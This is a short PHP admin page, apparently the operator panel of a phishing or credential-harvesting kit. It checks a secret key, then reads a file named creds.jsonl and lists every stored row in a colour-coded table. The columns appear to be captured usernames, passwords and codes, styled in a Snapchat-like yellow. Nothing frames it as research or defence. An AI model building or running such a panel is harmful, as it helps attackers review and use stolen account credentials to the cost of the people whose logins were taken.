<?php
if (!hash_equals(getenv('ADMIN_KEY') ?: '', $_GET['k'] ?? '')) {
    http_response_code(403); exit('nope');
}
$S = (getenv('STORE_DIR') ?: '/tmp') . '/creds.jsonl';
$rows = is_file($S) ? array_filter(array_map(fn($l) => explode("\t", rtrim($l, "\n")), file($S))) : [];
?>
<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<style>
 body{font:13px ui-monospace,monospace;background:#111;color:#eee;padding:14px}
 td{padding:4px 10px;border-bottom:1px solid #2a2a2a;white-space:nowrap}
 .U{color:#fffc00}.P{color:#4ade80}.C{color:#60a5fa}
</style>
<table>
<?php foreach ($rows as $r): ?>
 <tr><td><?= htmlspecialchars($r[0] ?? '') ?></td><td><?= htmlspecialchars($r[1] ?? '') ?></td>
 <td class="<?= htmlspecialchars($r[2][0] ?? '') ?>"><?= htmlspecialchars($r[2] ?? '') ?></td>
 <td><?= htmlspecialchars($r[3] ?? '') ?></td></tr>
<?php endforeach; ?>
</table>
